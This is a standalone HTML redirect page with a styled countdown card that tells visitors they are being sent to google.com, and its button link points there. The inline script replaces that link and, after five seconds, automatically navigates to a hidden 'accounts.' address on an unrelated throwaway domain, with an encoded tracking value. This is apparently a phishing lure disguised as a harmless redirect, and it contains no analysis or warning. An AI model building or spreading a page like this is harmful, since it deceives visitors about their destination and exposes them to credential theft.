<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Redirect page">
  <title>Redirecting…</title>

  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont,
                   "Segoe UI", sans-serif;
      background: #f6f7fb;
      color: #17181c;
    }

    .card {
      width: min(100%, 460px);
      padding: 42px 34px;
      text-align: center;
      background: #fff;
      border: 1px solid #e7e8ee;
      border-radius: 20px;
      box-shadow: 0 18px 50px rgba(20, 24, 40, 0.08);
    }

    .icon {
      width: 64px;
      height: 64px;
      margin: 0 auto 22px;
      display: grid;
      place-items: center;
      border-radius: 50%;
      background: #f0f2ff;
      color: #4f46e5;
      font-size: 28px;
    }

    h1 {
      margin: 0 0 10px;
      font-size: clamp(25px, 5vw, 32px);
      line-height: 1.2;
    }

    p {
      margin: 0 auto;
      max-width: 360px;
      color: #666b78;
      line-height: 1.6;
    }

    .countdown {
      margin: 24px 0;
      font-size: 14px;
      color: #777c88;
    }

    .countdown strong {
      color: #17181c;
    }

    .progress {
      width: 100%;
      height: 6px;
      margin: 0 0 26px;
      overflow: hidden;
      border-radius: 999px;
      background: #eceef4;
    }

    .progress span {
      display: block;
      width: 100%;
      height: 100%;
      transform-origin: left;
      background: #4f46e5;
      animation: shrink 5s linear forwards;
    }

    @keyframes shrink {
      from { transform: scaleX(1); }
      to { transform: scaleX(0); }
    }

    .button {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      min-height: 46px;
      padding: 0 22px;
      border-radius: 10px;
      background: #17181c;
      color: #fff;
      text-decoration: none;
      font-weight: 600;
      transition: transform .15s ease, opacity .15s ease;
    }

    .button:hover {
      transform: translateY(-1px);
      opacity: .92;
    }

    .button:focus-visible {
      outline: 3px solid #c7c9ff;
      outline-offset: 3px;
    }

    .destination {
      margin-top: 18px;
      font-size: 12px;
      color: #969aa5;
      word-break: break-all;
    }

    @media (max-width: 480px) {
      .card { padding: 34px 24px; }
    }
  </style>
</head>

<body>
  <main class="card" aria-labelledby="title">
    <div class="icon" aria-hidden="true">↗</div>

    <h1 id="title">Redirecting you</h1>
    <p>
      You’re being redirected to the destination page.
      If nothing happens automatically, use the button below.
    </p>

    <div class="countdown" aria-live="polite">
      Redirecting in <strong id="seconds">5</strong> seconds…
    </div>

    <div class="progress" aria-hidden="true">
      <span></span>
    </div>

    <a class="button" id="continueButton" href="https://www.google.com/">
      Continue now
    </a>

    <div class="destination">Destination: google.com</div>
  </main>

  <script>
    "use strict";

    const destination = "https://accounts.chvasc.cfd?zG1P4LzY=em9kbG4=";
    const secondsElement = document.getElementById("seconds");
    const button = document.getElementById("continueButton");

    button.href = destination;

    let seconds = 5;

    const timer = setInterval(() => {
      seconds -= 1;
      secondsElement.textContent = seconds;

      if (seconds <= 0) {
        clearInterval(timer);
        window.location.assign(destination);
      }
    }, 1000);
  </script>
</body>
</html>
